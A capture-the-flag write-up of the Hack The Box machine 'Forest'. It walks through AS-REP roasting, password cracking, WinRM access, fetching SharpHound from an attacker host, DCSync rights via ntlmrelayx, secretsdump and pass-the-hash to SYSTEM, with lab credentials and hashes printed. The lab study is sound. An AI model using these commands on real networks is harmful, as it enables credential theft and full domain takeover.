
# 1. Summary
- Enumerated the AD using crackmapexec.
- Attempted to use more than one lateral movement tool, i.e., winrm, psexec, smbexec, etc.
- Revisited AS-REP roasting. Learn about the "Do not require Kerberos preauthentication" privilege. 
- Used Bloodhound/Sharphound and practiced the Powerview module.
- Learned the exchange windows permissions group and revisited the concept of DCsync.
- Used ntlmrelayx, secretsdump to priv esc.
- Priv esced with mimiktaz


# 2. Technical Detail

## 2.1 Port Enumeration
```
# Nmap 7.92 scan initiated Tue Nov 29 16:19:42 2022 as: nmap -O -sC -sV -p- -oN nmap.all 10.10.10.161
...snip...
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-11-29 21:27:25Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49967/tcp open  msrpc        Microsoft Windows RPC
...snip...
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows


OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 29 16:21:49 2022 -- 1 IP address (1 host up) scanned in 127.15 seconds


```

Port 53 and 88 were enumerated, but they did not return anything fruiter. 

**SMB 139/445**
Got domain name from smb.
Color coding is awesome. It is terrible for reporting. 


```
 crackmapexec smb 10.10.10.161 --users |tee smb.users

[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[34m[*][0m Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[31m[-][0m Error enumerating domain users using dc ip 10.10.10.161: NTLM needs domain\username and a password
...snip...

[33mhtb.local\HealthMailboxfd87238           [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\HealthMailboxb01ac64           [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\HealthMailbox7108a4e           [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\HealthMailbox0659cc1           [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\sebastien                      [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\lucinda                        [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\svc-alfresco                   [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\andy                           [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\mark                           [0m
[1m[34mSMB[0m         10.10.10.161    445    FOREST           [1m[33mhtb.local\santi                          [0m

```

Using awk and sed, tailored the output and extracted the valid usernames. 

```
cat smb.users|awk -F" " '{print$5}'|grep htb|sed 's/htb.local\\/\n/'> users.txt



┌──(kali㉿kali)-[~/HTB/Forest]
└─$ cat users.txt|grep -v root |grep -v Health* |grep -v SM* > valid_users.txt 


──(kali㉿kali)-[~/HTB/Forest]
└─$ cat valid_users.txt  
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
sebastien
lucinda
svc-alfresco
andy
mark
santi



```



## 2.2 AS_REP roasting with "Do not Require Kerberos Preauthentication or UF_DONT_REQUIRE_PREAUTH"


When a target has Kerberos running and usernames are identified, the very next thing I can try is AS_REP with a "Do not Require Keberos Preauthentication" attack. This option does not require a password to be supplied. 

The pre-authentication step is the initial step in the Kerberos authentication, where a user sends an encrypted request to the KDC to authenticate to a service.

I used the impacket-GetNPUsers to start the pre-authentication step. Then Hastcat/John were used to decrypt the downloaded hash.  


```
└─$ impacket-GetNPUsers  htb/ -dc-ip 10.10.10.161 -usersfile ./valid_users.txt -request -format john -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-alfresco@HTB:973f4a4fa9f5bd1f541da70005b0685e$9fb58fb298bd7ea3730d280adbd6c29267871d358312115fd7a6c13b751b86240682c8c376de6dbfe0b4900aee322bfa65c85b142211a8d687d481c5627b0dd6b1ef3a42851120c8f36c21dd5ea06b038ea39100b67d25e5b51ae39a729d01bf2e84840d183dbaa8706a20a8040d5e2a23e2bdae4fa89f6b5e30c6986b605fa89babd39c96c2a6a532c26114e020d8fe2df9a3d0160a94b958fd01589931ff4dd3ab2d8b91ad2238d2c7953891129b4972e900df8a376f8dc3f3e6a509d2cee854259b60959bbfb724978577d562e8b989123cf1d544a963f76eb919146c1a2c
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

```

### 2.2.1 John/Hashcat

```
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ticket.tick 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB)     
1g 0:00:00:03 DONE (2022-12-01 16:33) 0.2958g/s 1208Kp/s 1208Kc/s 1208KC/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

OR

with hashcat

┌──(kali㉿kali)-[~/HTB/Forest]
└─$ hashcat -m 18200 -a 0 ./ticket.tick /usr/share/wordlists/rockyou.txt

$krb5asrep$svc-alfresco@HTB:5b8752295d87be6d3650183a6c77b00e$482c13d29de70557494907cddfcf3a8cae76ca81d3f38f2dfb814ed68f6907761d62c01ad78146f1727f26b21eb08c78492e940fa39f241aaca7b75f734bd9a2022500b6779fd5388b656845c4305f7a60f249baaf2fd7d4f474a2df93f5088ebd03427b9bffabd37cafba6396a3fed34f37627f491b4f26f6db3333ce4518b90bcd8f04013afe3e4edd5771ae189a81ba5c6311ddc288df15e1b7974f0ff86797c8fdda4d1fb88d2f0ed2fa9c10003123f1e5be72b3e207144884a80dc84d5d29dd711224ea7adc005bbcd30027c0d32cbe9ee6f501e9c580c9e19af814c98a:s3rvice

```
Resources
https://seuforia.wordpress.com/2018/09/19/do-not-require-kerberos-pre-authentication-for-users-create-by-ambari-on-ad/
https://medium.com/r3d-buck3t/kerberos-attacks-as-rep-roasting-2549fd757b5

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat


## 2.3 System Access

The following credentials were revealed from the previous step. 
```

/svc-alfresco:s3rvice
```

Since port 5985 was identified, I gained system access via winrm. 

I attempted using psexec, but it didn't work. 
Crackmapexec winrm was used, but I could not get a shell from it.
msfconsole was also used, but again I could not gain an interactive shell. 

```
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ impacket-psexec forest.htb/svc-alfresco:s3rvice@10.10.10.161          
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.


──(kali㉿kali)-[~/HTB/Forest]
└─$ crackmapexec winrm 10.10.10.161 -d htb -u svc-alfresco -p s3rvice -x "whoami"                                
HTTP        10.10.10.161    5985   10.10.10.161     [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   10.10.10.161     [+] htb\svc-alfresco:s3rvice (Pwn3d!)
WINRM       10.10.10.161    5985   10.10.10.161     [+] Executed command
WINRM       10.10.10.161    5985   10.10.10.161     htb\svc-alfresco


```

I 
https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm

```

1562  sudo gem install evil-winrm                                                                                  
1563  evil-winrm -u svc-alfresco -p s3rvice 10.10.10.161   

```
I gained the system access with evil-winrm. The first thing I did was I upload SharpHound and Powerview to the target.

SharpHound and Powerview are well-known AD enumeration tools. SharpHounds generates zip file with AD system information, which can be ingested into Bloodhound. 

SharpHound can be run on the target system to gather information. SharpHound will create many JSON files. 
I can import the zip file to BloodHound.

The file can be exported in many ways; here, I used the smb option.  
```
┌──(kali㉿kali)-[~/HTB/Forest/exploit/bloodhound]
└─$ unzip 20221203162916_BloodHound.zip 
Archive:  20221203162916_BloodHound.zip
  inflating: 20221203162916_computers.json  
  inflating: 20221203162916_users.json  
  inflating: 20221203162916_groups.json  
  inflating: 20221203162916_containers.json  
  inflating: 20221203162916_domains.json  
  inflating: 20221203162916_gpos.json  
  inflating: 20221203162916_ous.json  
                                          
```


```
wget 10.10.16.9/SharpHound.ps1 -O SharpHound.ps1

wget 10.10.16.9/powerview.ps1 -O powerview.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> import-module ./SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice



Kali
impacket-smbserver share . -smb2support -username scriptkiddie -password aa

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net use \\10.10.16.9\share /u:scriptkiddie aa


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net use /d \\10.10.16.9\share



```

### 2.3.1. Side note - pywinrm

A side note. I tried to make my own code to communicate via winrm. Oh well. It didn't work. 


https://stackoverflow.com/questions/32324023/how-to-connect-to-remote-machine-via-winrm-in-python-pywinrm-using-domain-acco

```
└─$ cat mycode.py                           
#!/usr/bin/python3

import winrm
from winrm.protocol import Protocol


host = '10.10.10.161'
domain = 'local.htb'
user = 'svc-alfresco'
password = 's3rvice'
s=winrm.Session(host, auth=(domain + '\\' + user, password, transport=='ntlm'))
r=s.run_ps("hostname")
print(r.std_out)




#session = winrm.Session(host, auth=('{}@{}'.format(user,domain), password), transport='ntlm')

#result = session.run_cmd('ipconfig', ['/all']) # To run command in cmd

#result = session.run_ps('Get-Acl') # To run Powershell block


```



## 2.4 BloodHound-ing

Once BloodHound digests the zip file, a nice graph will show the AD structure of the target.

In summary, 

svc-alfresco is a member of the service account. 
Service Account is a member of Privileged IT Accounts
Privileged IT accounts are members of Account Operators. 

svc-alfresco --member of--> Service Account --member of --> Privileged IT accounts --Memberof-->Account Operators--WriteDacl--> Enterprise Admins -- Memberof -->Administrator. 

According to the below MS page,
```
Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can log in locally to domain controllers.
```



### 2.4.1. GenericAll

BloodHound suggests the following attack path. 
1. Add a malicious user under the Exchange Windows permissions group using Genericall privileges on Accounts Operators. 
2. Then, grant the user DCsync Privileges using EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL's modify DACL privilege. 


```powershell
net group "Domain Admins" harmj0y /add /domain

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
```
Below are from BloodHound's help page,

	The members of the group ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.

	Full control of a group allows you to directly modify group membership of the group.

	There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

	To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as a member of ACCOUNT OPERATORS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):



### 2.4.2 WriteDacl - DCSYNC

	To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.

	You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):


## 2.5 DomainGroup
BloodHound makes everything so easy. So let's do this harder way.  

https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators


Get-domaingroup is a part of powerview module. 
One significant lesson from this module is the importance of Enmeration. 

Using DomainGroup in the Powerview module, search for SamAccountName

### 2.5.1 DomainGroup
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> get-domaingroup |select Samaccountname
                                                            
samaccountname                                              
--------------                                              
Administrators              
Users                                                       
Guests                      
Print Operators
Backup Operators
Replicator           
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users                                       
IIS_IUSRS               
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
System Managed Accounts Group
Storage Replica Administrators 
Domain Computers          
Domain Controllers          
Schema Admins               
Enterprise Admins    
Cert Publishers     
Domain Admins   
Domain Users          
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators                                                                                                        
Account Operators
Pre-Windows 2000 Compatible Access
Incoming Forest Trust Builders 
Windows Authorization Access Grou
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers                                
Protected Users           
Key Admins                  
Enterprise Key Admins       
DnsAdmins            
DnsUpdateProxy      
Organization Management
Recipient Management  
View-Only Organization Management
Public Folder Management   
UM Management      
Help Desk                                                                                                               
Records Management
Discovery Management                                        
Server Management                                           
Delegated Setup                                             
Hygiene Management                                          
Compliance Management                                       
Security Reader                                             
Security Administrator      
Exchange Servers                                            
Exchange Trusted Subsystem  
Managed Availability Servers
Exchange Windows Permissions
ExchangeLegacyInterop
$D31000-NSEL5BRJ63V7
Service Accounts
Privileged IT Accounts 
test                


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> get-domaingroup |select Samaccountname|findstr Exchange*
Exchange Servers
Exchange Trusted Subsystem
Exchange Windows Permissions
ExchangeLegacyInterop

```


Based on ADsecurity.org, https://adsecurity.org/?p=4119, the exchange windows permissions group's high privilege maybe common to many AD setups. 

	The main vulnerability here is that Exchange has high privileges in the Active Directory domain. The Exchange Windows Permissions group has WriteDacl access on the Domain object in Active Directory, which enables any member of this group to modify the domain privileges, among which is the privilege to perform DCSync operations. Users or computers with this privilege can perform synchronization operations that are normally used by Domain Controllers to replicate, which allows attackers to synchronize all the hashed passwords of users in the Active Directory.




## 2.6. DCsync attack Escalating Privilges with Exchange


Launched the DCsync attack according to the BloodHound. The details are in the below resources. 
https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user scriptkiddie scriptkiddie /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Trusted Subsystem" scriptkiddie /add /domain
The command completed successfully.
```


So here I took an easier route. However, BloodHound clearly mentions that this is bad from an OPSEC perspective.
Noob from this article shows another option to add a user.
https://noobintheshell.medium.com/htb-forest-43aaf12f44b1#5216
```
*Evil-WinRM* PS C:\> dsadd user "cn=noob,cn=users,dc=htb,dc=local" -samid noob -upn noob@htb.local -disabled no -pwd noobnoob -mustchpwd no
*Evil-WinRM* PS C:\> dsmod group 'CN=remote management users,CN=builtin,DC=htb,DC=local' -addmbr 'cn=noob,cn=users,dc=htb,dc=local'
*Evil-WinRM* PS C:\> dsmod group 'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local' -addmbr 'cn=noob,cn=users,dc=htb,dc=local'

```

Once the user scriptkiddie is added, it is time to launch MITM attack using ntlmrelayx. 
NTLMrelayx will add Replication-Get-Changes-All privileges to the user account. 


### 2.6.1. Pass the Hash

On Screen 1, I setup MITM attack with ntlmrelayx. This tool will look for a user "scriptkiddie". This session will modify the user's privilege when a log-in attempt is observed. 
On screen 2, I attempt to log in with whatever. 


```
Then from my kali screen 1
impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user scriptkiddie


From my kali screen 2
└─$ impacket-psexec forest.htb/scriptkiddie:scriptkiddie@10.10.16.9            



my kali screen 1 will say
┌──(kali㉿kali)-[~/HTB/Forest]                              
└─$ impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user scriptkiddie
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
                                                            
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..    
[*] Protocol Client LDAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.16.9, attacking target ldap://10.10.10.161
[*] Authenticating against ldap://10.10.10.161 as FOREST.HTB/SCRIPTKIDDIE SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User scriptkiddie now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20221203-212806.restore
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!


```


### 2.6.1. DC secretdumping -
```
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump forest.htb/scriptkiddie:scriptkiddie@10.10.10.161 -just-dc-user administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
[*] Cleaning up... 
                         
```


Root with psexec.py
```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec forest.htb/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file RykCEJQe.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service BDRH on 10.10.10.161.....
[*] Starting service BDRH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```

### 2.6.3 OR try with mimikatz.

I tried downloading and running mimikatz, but Evil-Rm was not working well with mimiktaz.  I will probably need a windows box. 
```
──(kali㉿kali)-[~/HTB/Forest/exploit]
└─$ locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe


lsadump::dcsync /user:krbtgt /domain:htb.local
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:administrator /domain:htb.local /ntlm:32693b11e6aa90eb43d32c72a07ceea6


```

Resource



https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md

https://05t3.github.io/posts/Active-Directory-Lab-Setup/

https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology

https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb


## HTB Pwned page
https://www.hackthebox.com/achievement/machine/288193/212

